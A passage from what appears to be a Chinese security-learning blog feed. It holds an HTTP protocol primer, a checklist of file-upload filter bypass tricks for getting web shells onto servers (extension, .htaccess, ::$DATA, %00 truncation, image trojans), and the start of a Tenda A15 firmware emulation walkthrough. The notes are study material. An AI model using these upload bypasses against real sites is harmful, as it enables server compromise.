keep-alive</code>**则是为了避免频繁建立和关闭连接而保持连接的持续性，减少开销，但这不意味着HTTP协议本身具备“状态”或“记忆”能力。</li></ul><h2 id="0x3-工作流程"><a href="#0x3-工作流程" class="headerlink" title="0x3 工作流程"></a>0x3 工作流程</h2><p><strong>一次HTTP操作的四个步骤：</strong></p><ol><li><strong>建立连接</strong>：<ul><li>客户端与服务器之间需要建立TCP连接。</li><li>只要用户点击一个超级链接，HTTP操作就开始。</li></ul></li><li><strong>发送HTTP请求</strong>：<ul><li>客户端通过已建立的连接向服务器发送请求。</li><li>请求的格式包含：<ul><li><strong>统一资源标识符（URL）</strong></li><li><strong>协议版本号</strong>（如HTTP&#x2F;1.1）</li><li><strong>MIME信息</strong>（请求修饰符、客户机信息、可能的内容等）</li></ul></li></ul></li><li><strong>服务器响应请求</strong>：<ul><li>服务器接收到请求后，返回响应信息。</li><li>响应的格式包含：<ul><li><strong>状态行</strong>（协议版本号、成功或错误的状态码）</li><li><strong>MIME信息</strong>（服务器信息、实体信息、可能的内容等）</li></ul></li></ul></li><li><strong>客户端显示信息</strong>：<ul><li>客户端接收到服务器返回的信息。</li><li>通过浏览器显示内容给用户。</li><li>客户端与服务器断开连接。</li></ul></li></ol><h2 id="0x4-头域"><a href="#0x4-头域" class="headerlink" title="0x4 头域"></a>0x4 头域</h2><p>发出的请求信息格式如下：</p><ul><li>请求行，例如GET &#x2F;images&#x2F;logo.gif HTTP&#x2F;1.1，表示从&#x2F;images目录下请求logo.gif这个文件。</li><li>（请求）头，例如Accept-Language: en</li><li>空行</li><li>可选的消息体　请求行和标题必须以<CR><LF>作为结尾（也就是，回车然后换行）。空行内必须只有<CR><LF> 而无其他空格。在HTTP&#x2F;1.1协议中，所有的请求头，除post外，都是可选的。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250414170723670.png" alt="image-20250414170723670"></p><p>三个部分分别是：请求行、消息报头、请求正文。</p><h2 id="0x5-请求方法"><a href="#0x5-请求方法" class="headerlink" title="0x5 请求方法"></a>0x5 请求方法</h2><p>请求方法有下面八种</p><table><thead><tr><th><strong>请求方法</strong></th><th><strong>描述</strong></th><th><strong>常见用途</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>请求指定的资源，通常用于获取数据。</td><td>获取网页、图片、API数据等。</td></tr><tr><td><strong>POST</strong></td><td>向服务器提交数据，通常用于表单提交或上传数据。</td><td>提交表单数据，上传文件，创建资源等。</td></tr><tr><td><strong>PUT</strong></td><td>用于更新指定的资源，要求请求体包含更新后的完整数据。</td><td>更新现有资源，如编辑数据、修改用户信息等。</td></tr><tr><td><strong>DELETE</strong></td><td>删除指定的资源。</td><td>删除服务器上的文件、记录或数据。</td></tr><tr><td><strong>HEAD</strong></td><td>与GET方法类似，但服务器只返回响应头，不返回响应体。</td><td>检查某个资源是否存在、获取资源的元数据等。</td></tr><tr><td><strong>OPTIONS</strong></td><td>查询服务器支持哪些HTTP方法。</td><td>查询服务器支持的请求方法、CORS（跨域资源共享）等。</td></tr><tr><td><strong>PATCH</strong></td><td>用于局部更新指定的资源，通常只提供需要修改的数据。</td><td>更新资源的一部分，例如修改用户资料中的一项字段。</td></tr><tr><td><strong>TRACE</strong></td><td>回显服务器收到的请求，用于诊断请求链路。</td><td>诊断HTTP请求路径，查看中间的代理服务器和客户端之间的通信。</td></tr><tr><td><strong>CONNECT</strong></td><td>建立一个到目标服务器的隧道，用于加密协议（如HTTPS）。</td><td>常用于通过HTTP代理访问加密的内容。</td></tr></tbody></table><p>*<em>POST和GET请求的区别</em></p><p>下面是 <strong>POST</strong> 和 <strong>GET</strong> 请求的主要区别：</p><table><thead><tr><th><strong>区别</strong></th><th><strong>GET请求</strong></th><th><strong>POST请求</strong></th></tr></thead><tbody><tr><td><strong>数据传输方式</strong></td><td>数据通过URL传递，参数附加在URL后面。</td><td>数据通过请求体（body）传递，不显示在URL中。</td></tr><tr><td><strong>安全性</strong></td><td>数据公开，容易被截获，不适合传递敏感信息。</td><td>数据不显示在URL中，相对较为安全，但依然需要加密。</td></tr><tr><td><strong>缓存</strong></td><td>GET请求的结果可以被缓存，适用于只读操作。</td><td>POST请求的结果一般不被缓存。</td></tr><tr><td><strong>请求大小</strong></td><td>GET请求的大小受限于URL的长度，通常约为2048字符。</td><td>POST请求没有固定大小限制，理论上可以提交更大的数据。</td></tr><tr><td><strong>幂等性</strong></td><td>GET请求是幂等的，意味着多次请求不会产生副作用。</td><td>POST请求不是幂等的，重复请求可能会创建多个资源或进行多次操作。</td></tr><tr><td><strong>使用场景</strong></td><td>适用于获取数据、查询等操作。</td><td>适用于提交数据、创建或修改资源等操作。</td></tr><tr><td><strong>书写形式</strong></td><td>URL中包含请求参数，如：<code>GET /search?q=keyword</code>。</td><td>请求参数包含在请求体中，如：<code>POST /submit</code>。</td></tr><tr><td><strong>浏览器行为</strong></td><td>浏览器会在历史记录中保存GET请求，且可以通过回退按钮重试请求。</td><td>浏览器不会保存POST请求的历史记录，用户无法通过回退按钮重新提交。</td></tr><tr><td><strong>数据传输容量</strong></td><td>受限于URL长度和浏览器&#x2F;服务器的限制，通常不能传输大量数据。</td><td>可以传输大量数据，适合表单提交、文件上传等。</td></tr></tbody></table><h2 id="0x6-解决HTTP无状态的问题"><a href="#0x6-解决HTTP无状态的问题" class="headerlink" title="0x6 解决HTTP无状态的问题"></a>0x6 解决HTTP无状态的问题</h2><p>HTTP协议本身是无状态的，这意味着每个请求都是独立的，服务器不会保存客户端请求的任何信息。虽然这种设计使得HTTP非常简单和灵活，但在某些场景下，如需要跟踪用户会话（如登录状态、购物车内容等），无状态性会带来一定的挑战。为了解决这个问题，通常会使用以下几种方法来保持状态：</p><h3 id="1-Cookie"><a href="#1-Cookie" class="headerlink" title="1. Cookie"></a>1. <strong>Cookie</strong></h3><ul><li><strong>原理</strong>：通过在客户端（浏览器）存储小量的数据（称为<strong>Cookie</strong>）来维持状态。服务器发送一个包含状态信息的Cookie给客户端，客户端在后续的请求中将该Cookie附带在请求头中，从而实现状态的保持。</li><li><strong>优点</strong>：简单、易于实现，广泛用于会话管理和用户认证。</li><li><strong>缺点</strong>：客户端存储的容量有限，每个请求都需要携带，可能会影响性能。敏感信息需加密以保证安全。</li><li><strong>示例</strong>：用户登录网站后，服务器会返回一个包含session ID的Cookie，后续请求中浏览器会携带该Cookie，服务器通过这个ID来识别用户。</li></ul><p>示例：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Set</span><span class="hljs-operator">-</span><span class="hljs-variable">Cookie</span><span class="hljs-operator">:</span> <span class="hljs-variable">sessionId</span><span class="hljs-operator">=</span><span class="hljs-variable">abc123</span><span class="hljs-operator">;</span> <span class="hljs-built_in">Path</span><span class="hljs-operator">=/;</span> <span class="hljs-variable">HttpOnly</span><br></code></pre></td></tr></table></figure><h3 id="2-Session"><a href="#2-Session" class="headerlink" title="2. Session"></a>2. <strong>Session</strong></h3><ul><li><strong>原理</strong>：服务器端通过存储会话数据（如数据库、内存等）来保存状态。客户端通过Session ID（通常存储在Cookie中）来标识会话，每次请求时，客户端都会携带这个ID，服务器通过该ID来查找对应的会话数据。</li><li><strong>优点</strong>：状态存储在服务器端，数据更安全，不会暴露给客户端。</li><li><strong>缺点</strong>：服务器需要管理会话数据，存储容量受限，需要在服务器端维护会话。</li><li><strong>示例</strong>：常见的Web框架（如Flask、Django）提供了内建的Session支持，通常通过Cookie传递Session ID。</li></ul><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">session[<span class="hljs-string">&#x27;user_id&#x27;</span>] = user.<span class="hljs-built_in">id</span>  <span class="hljs-comment"># 保存用户ID</span><br></code></pre></td></tr></table></figure><h3 id="3-Token（如JWT）"><a href="#3-Token（如JWT）" class="headerlink" title="3. Token（如JWT）"></a>3. <strong>Token（如JWT）</strong></h3><ul><li><strong>原理</strong>：通过使用令牌（Token）来维持会话状态，常见的令牌包括<strong>JSON Web Token（JWT）</strong>。客户端在每次请求时附带一个加密的Token，Token包含了用户的身份和权限等信息。服务器通过解密Token来验证用户身份和权限。</li><li><strong>优点</strong>：适用于分布式系统、跨域认证等场景。客户端存储Token（通常存储在localStorage或SessionStorage），无需服务器端存储。</li><li><strong>缺点</strong>：Token存储在客户端，可能存在被篡改的风险。需要做好Token的安全存储和过期处理。</li><li><strong>示例</strong>：用户登录后，服务器生成一个JWT，客户端存储该JWT，后续请求携带该Token进行身份验证。</li></ul><p>示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;user_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">12345</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1628707200</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1628610800</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="4-URL参数"><a href="#4-URL参数" class="headerlink" title="4. URL参数"></a>4. <strong>URL参数</strong></h3><ul><li><strong>原理</strong>：通过将状态信息嵌入到URL中，服务器可以通过URL来识别不同的请求。虽然这种方式通常只适用于短期的状态保持（如用户的临时筛选条件），但也有一定的局限性。</li><li><strong>优点</strong>：简单直观，尤其适用于短期状态传递。</li><li><strong>缺点</strong>：URL暴露状态信息，不适合存储敏感信息。且长时间或大规模传输状态可能导致URL变长或不易管理。</li><li><strong>示例</strong>：在URL中传递查询参数来维持状态。</li></ul><p>示例：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/example.com/</span><span class="hljs-string">?s</span>ession_id=abc123<br></code></pre></td></tr></table></figure><h3 id="5-Hidden-Form-Fields"><a href="#5-Hidden-Form-Fields" class="headerlink" title="5. Hidden Form Fields"></a>5. <strong>Hidden Form Fields</strong></h3><ul><li><strong>原理</strong>：在表单中使用隐藏字段（<code>&lt;input type=&quot;hidden&quot;&gt;</code>）来传递状态信息，客户端提交表单时，状态信息会随表单一起提交到服务器。这种方式主要用于表单提交时维持状态。</li><li><strong>优点</strong>：可以将信息随表单提交，适合用于表单处理场景。</li><li><strong>缺点</strong>：仅适用于表单提交，状态信息暴露在页面源代码中，安全性较差。</li><li><strong>示例</strong>：通过隐藏表单字段在表单提交时维持状态。</li></ul><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;session_id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;abc123&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="6-Local-Storage-Session-Storage"><a href="#6-Local-Storage-Session-Storage" class="headerlink" title="6. Local Storage &#x2F; Session Storage"></a>6. <strong>Local Storage &#x2F; Session Storage</strong></h3><ul><li><strong>原理</strong>：HTML5提供的<strong>Local Storage</strong>和<strong>Session Storage</strong>允许在客户端浏览器中存储数据。Local Storage是持久化存储，而Session Storage只在会话期间有效。通过存储在浏览器中的数据，可以维持状态，尤其适用于单页面应用（SPA）。</li><li><strong>优点</strong>：存储空间大，数据存储在客户端，无需依赖服务器。</li><li><strong>缺点</strong>：存储在客户端，安全性差。不能直接与服务器进行交互，需要通过AJAX请求传递数据。</li><li><strong>示例</strong>：存储用户的主题偏好或认证Token。</li></ul><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;abc123&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="7-HTTP头（Authorization-Header）"><a href="#7-HTTP头（Authorization-Header）" class="headerlink" title="7. HTTP头（Authorization Header）"></a>7. <strong>HTTP头（Authorization Header）</strong></h3><ul><li><strong>原理</strong>：通过HTTP请求头中的<strong>Authorization</strong>字段来传递认证信息（如用户名、密码或Token）。这通常与JWT或OAuth结合使用，客户端在每次请求时将认证信息传递给服务器，服务器验证后返回响应。</li><li><strong>优点</strong>：适用于API认证，尤其是RESTful架构中的认证和授权。</li><li><strong>缺点</strong>：需要在每个请求中发送认证信息，可能增加带宽开销。Token泄露时可能被滥用。</li><li><strong>示例</strong>：在请求头中传递JWT或Bearer Token。</li></ul><p>示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Authorization: Bearer abc123<br></code></pre></td></tr></table></figure><h2 id="0x7-URL详解"><a href="#0x7-URL详解" class="headerlink" title="0x7 URL详解"></a>0x7 URL详解</h2><p>URL 用于定位互联网上的资源，通常包含以下几个部分：</p><h3 id="URL-的基本格式："><a href="#URL-的基本格式：" class="headerlink" title="URL 的基本格式："></a>URL 的基本格式：</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">scheme://host<span class="hljs-comment">[:port]</span>/path<span class="hljs-comment">[;url-params]</span><span class="hljs-comment">[?query-string]</span><span class="hljs-comment">[#anchor]</span><br></code></pre></td></tr></table></figure><h4 id="1-Scheme（协议）"><a href="#1-Scheme（协议）" class="headerlink" title="1. Scheme（协议）"></a>1. <strong>Scheme（协议）</strong></h4><ul><li><strong>作用</strong>：指定访问资源的协议，如 HTTP、HTTPS、FTP 等。</li><li><strong>示例</strong>：<code>http</code></li></ul><h4 id="2-Host（主机）"><a href="#2-Host（主机）" class="headerlink" title="2. Host（主机）"></a>2. <strong>Host（主机）</strong></h4><ul><li><strong>作用</strong>：指定服务器的地址，可以是 IP 或域名。</li><li><strong>示例</strong>：<code>www.example.com</code></li></ul><h4 id="3-Port（端口）"><a href="#3-Port（端口）" class="headerlink" title="3. Port（端口）"></a>3. <strong>Port（端口）</strong></h4><ul><li><strong>作用</strong>：指定访问服务器时的端口（可选，默认为 HTTP 的 80 端口）。</li><li><strong>示例</strong>：<code>:8080</code>（如果使用非默认端口）</li></ul><h4 id="4-Path（路径）"><a href="#4-Path（路径）" class="headerlink" title="4. Path（路径）"></a>4. <strong>Path（路径）</strong></h4><ul><li><strong>作用</strong>：指定资源的具体位置。</li><li><strong>示例</strong>：<code>/images/pic.jpg</code></li></ul><h4 id="5-Query-String（查询字符串）"><a href="#5-Query-String（查询字符串）" class="headerlink" title="5. Query String（查询字符串）"></a>5. <strong>Query String（查询字符串）</strong></h4><ul><li><strong>作用</strong>：传递给服务器的数据，通常以 <code>?</code> 开始，多个参数用 <code>&amp;</code> 分隔。</li><li><strong>示例</strong>：<code>?name=John&amp;age=30</code></li></ul><h4 id="6-Anchor（锚点）"><a href="#6-Anchor（锚点）" class="headerlink" title="6. Anchor（锚点）"></a>6. <strong>Anchor（锚点）</strong></h4><ul><li><strong>作用</strong>：页面内部的定位点，用 <code>#</code> 标记。</li><li><strong>示例</strong>：<code>#section1</code></li></ul><h3 id="示例-URL："><a href="#示例-URL：" class="headerlink" title="示例 URL："></a>示例 URL：</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www.example.com/index.html?name=John<span class="hljs-meta">#about</span><br></code></pre></td></tr></table></figure><ul><li><strong>Scheme</strong>: <code>http</code></li><li><strong>Host</strong>: <code>www.example.com</code></li><li><strong>Path</strong>: <code>/index.html</code></li><li><strong>Query String</strong>: <code>?name=John</code></li><li><strong>Anchor</strong>: <code>#about</code></li></ul><h2 id="0x8-HTTP响应码"><a href="#0x8-HTTP响应码" class="headerlink" title="0x8 HTTP响应码"></a>0x8 HTTP响应码</h2><p>这是常见的 HTTP 响应码及其含义的表格：</p><table><thead><tr><th>响应码</th><th>类别</th><th>含义</th></tr></thead><tbody><tr><td><strong>100</strong></td><td>信息性响应</td><td>Continue：客户端应继续请求。</td></tr><tr><td><strong>101</strong></td><td>信息性响应</td><td>Switching Protocols：服务器接受请求，切换协议。</td></tr><tr><td><strong>200</strong></td><td>成功响应</td><td>OK：请求成功，返回请求的数据。</td></tr><tr><td><strong>201</strong></td><td>成功响应</td><td>Created：请求成功，资源已创建。</td></tr><tr><td><strong>202</strong></td><td>成功响应</td><td>Accepted：请求已接受，但尚未处理。</td></tr><tr><td><strong>204</strong></td><td>成功响应</td><td>No Content：请求成功，但没有返回内容。</td></tr><tr><td><strong>301</strong></td><td>重定向响应</td><td>Moved Permanently：资源已永久移动到新位置。</td></tr><tr><td><strong>302</strong></td><td>重定向响应</td><td>Found：资源暂时移动到其他位置。</td></tr><tr><td><strong>304</strong></td><td>重定向响应</td><td>Not Modified：资源未修改，可使用缓存的副本。</td></tr><tr><td><strong>400</strong></td><td>客户端错误</td><td>Bad Request：请求格式错误，服务器无法理解。</td></tr><tr><td><strong>401</strong></td><td>客户端错误</td><td>Unauthorized：未授权，需要身份验证。</td></tr><tr><td><strong>403</strong></td><td>客户端错误</td><td>Forbidden：禁止访问，服务器拒绝请求。</td></tr><tr><td><strong>404</strong></td><td>客户端错误</td><td>Not Found：找不到请求的资源。</td></tr><tr><td><strong>405</strong></td><td>客户端错误</td><td>Method Not Allowed：请求方法不被允许。</td></tr><tr><td><strong>408</strong></td><td>客户端错误</td><td>Request Timeout：请求超时，服务器没有收到完整请求。</td></tr><tr><td><strong>500</strong></td><td>服务器错误</td><td>Internal Server Error：服务器内部错误。</td></tr><tr><td><strong>502</strong></td><td>服务器错误</td><td>Bad Gateway：作为网关或代理的服务器收到无效响应。</td></tr><tr><td><strong>503</strong></td><td>服务器错误</td><td>Service Unavailable：服务器不可用，通常是由于过载或维护。</td></tr><tr><td><strong>504</strong></td><td>服务器错误</td><td>Gateway Timeout：作为网关或代理的服务器未及时收到响应。</td></tr></tbody></table><p>这是一些常见的 HTTP 响应码，不同的响应码用于表示不同的请求状态或服务器情况。</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门之文件上传</title>
    <link href="/2025/04/11/WEB%E5%85%A5%E9%97%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/04/11/WEB%E5%85%A5%E9%97%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB入门之文件上传"><a href="#WEB入门之文件上传" class="headerlink" title="WEB入门之文件上传"></a>WEB入门之文件上传</h1><p>开门见山，来个关键图</p><p><a href="https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png"><img src="https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png" alt="判断上传漏洞类型"></a></p><p>通过半天的学习，我这个web小白也对文件上传有了一点点理解</p><p>总结了几个方面（当然是很简单的QAQ，难得也不会）</p><h2 id="客户端检查绕过"><a href="#客户端检查绕过" class="headerlink" title="客户端检查绕过"></a>客户端检查绕过</h2><ol><li>删除js代码或者禁用js</li><li>直接用控制台控制返回值</li><li>把木马修改为可以上传的文件后缀，然后burp抓包，修改文件后缀</li></ol><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ol><li>上传特殊可解析后缀(.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.phtml”)</li><li>上传.htaccess配置文件绕过</li><li>后缀大小写绕过</li><li>点绕过</li><li>空格绕过</li><li>::$DATA绕过(windows下)</li><li>双写后缀绕过</li></ol><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><ol><li>MIME绕过</li><li>%00绕过</li><li>0x00截断</li></ol><h2 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h2><p>上传图片马，利用文件包含漏洞利用</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOT漏洞挖掘初体验-Tenda A15</title>
    <link href="/2025/04/03/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/"/>
    <url>/2025/04/03/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/</url>
    
    <content type="html"><![CDATA[<h1 id="Tenda-A15-固件模拟与漏洞复现"><a href="#Tenda-A15-固件模拟与漏洞复现" class="headerlink" title="Tenda A15 固件模拟与漏洞复现"></a>Tenda A15 固件模拟与漏洞复现</h1><h2 id="01-前言"><a href="#01-前言" class="headerlink" title="01 前言"></a>01 前言</h2><p>最近也是准备朝着实战方向进军，规划每周都复现一些漏洞，实战确实和CTF差别很大，打CTF的时候，很少用到网络上的知识，基本上都是纯粹的二进制漏洞，但是实战的时候发现自己真是个“偏科生”一点关系到一点web方面的知识，就卡住了，这下终于理解以前学习逆向的学长为什么到最后都是全栈选手了</p><h2 id="02固件解包"><a href="#02固件解包" class="headerlink" title="02固件解包"></a>02固件解包</h2><p><a href="https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip">固件下载地址</a></p><p>固件下载好之后对于我们这些初出茅庐的新手来说，只能选择binwalk3进行一键解包，简直不要太亲民。但是要是遇见没法一键解包的情况目前还不知道怎么处理，到时候自求多福吧</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png" alt="image-20250403202726384"></a></p><p>再文件夹中找到文件系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SH">find . -<span class="hljs-built_in">type</span> d -iname <span class="hljs-string">&quot;*root*&quot;</span><br><br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202902140.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202902140.png" alt="image-20250403202902140"></a></p><p>这就是我们需要的东西，由于目录路径一般比较深，可以把文件系统copy到方便找打的地方，后边要经常用</p><p>然后就是查看一下IOT设备框架了，直接找到bin中的busybx，发现是mipsel</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203513118.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203513118.png" alt="image-20250403203513118"></a></p><p>这样下来我们就做好了基础的准备</p><h2 id="03-信息收集"><a href="#03-信息收集" class="headerlink" title="03 信息收集"></a>03 信息收集</h2><p>都说漏洞挖掘犹如大海捞针，如果自己一个一个文件看的话，可能效率会很低，这时候都需要用一些工具，来进行自动化分析或者信息收集，这次我只用的是入门级别工具firmwalker，直接开扫</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203909240.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203909240.png" alt="image-20250403203909240"></a></p><p>可以发现WEB服务是httpd</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204201390.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204201390.png" alt="image-20250403204201390"></a></p><h2 id="04-分析启动项"><a href="#04-分析启动项" class="headerlink" title="04 分析启动项"></a>04 分析启动项</h2><p>再目录etc_ro中有init.d目录，其中的文件就是启动项</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204732152.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204732152.png" alt="image-20250403204732152"></a></p><p>这些操作我们能执行的都要执行一下，要不一会模拟运行就会出问题呢（别问我怎么知道的😭）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># 创建所有必要的目录（基于当前目录 ./）</span><br><span class="hljs-built_in">mkdir</span> -p ./var/etc<br><span class="hljs-built_in">mkdir</span> -p ./var/media<br><span class="hljs-built_in">mkdir</span> -p ./var/webroot<br><span class="hljs-built_in">mkdir</span> -p ./var/etc/iproute<br><span class="hljs-built_in">mkdir</span> -p ./var/run<br><span class="hljs-built_in">mkdir</span> -p ./etc/udhcpc<br><span class="hljs-built_in">mkdir</span> -p ./var/debug<br><span class="hljs-built_in">mkdir</span> -p ./dev/pts<br><span class="hljs-built_in">mkdir</span> -p ./var/ppp<br><span class="hljs-built_in">mkdir</span> -p ./tmp<br><br><span class="hljs-comment"># 复制文件（从 ./etc_ro 和 ./webroot_ro 到目标目录）</span><br><span class="hljs-built_in">cp</span> -rf ./etc_ro/* ./etc/<br><span class="hljs-built_in">cp</span> -rf ./webroot_ro/* ./var/webroot <span class="hljs-comment">#这个就是部署web服务</span><br><br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403205848830.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403205848830.png" alt="image-20250403205848830"></a></p><h2 id="04用户模拟运行"><a href="#04用户模拟运行" class="headerlink" title="04用户模拟运行"></a>04用户模拟运行</h2><p>我们直接运行一下启动项看看怎么个事</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-built_in">cp</span> $(<span class="hljs-built_in">which</span> qemu-mipsel-static) ./<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/httpd<br><br><br></code></pre></td></tr></table></figure><p>成功运行但是ip貌似不对</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403210521250.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403210521250.png" alt="image-20250403210521250"></a></p><p>IDA打开二进制文件分析一下，ip到底是怎么获取的</p><p>字符串查找发现发现有用信息</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211309565.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211309565.png" alt="image-20250403211309565"></a></p><p>向上查看赋值情况，为函数参数赋值，交叉引用向上继续查</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211423338.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211423338.png" alt="image-20250403211423338"></a></p><p>传入的是bss段地址，继续交叉引用查看赋值</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211617368.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211617368.png" alt="image-20250403211617368"></a></p><p>发现再main函数中发现赋值情况，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C">GetValue(<span class="hljs-string">&quot;sys.workmode&quot;</span>, value); <span class="hljs-comment">//获取系统工作模式</span><br><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(value, <span class="hljs-string">&quot;apclient&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(value, <span class="hljs-string">&quot;ap&quot;</span>) ) <span class="hljs-comment">//可能代表无线 AP 模式</span><br>&#123;<br>  <span class="hljs-built_in">strncpy</span>(g_lan_ip, <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">0x10</span>u);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  lan_ifname = ifaddrs_get_lan_ifname(); <span class="hljs-comment">//获取 LAN 口的网络接口名称 --只检查 br0 或 eth0</span><br>  <span class="hljs-keyword">if</span> ( 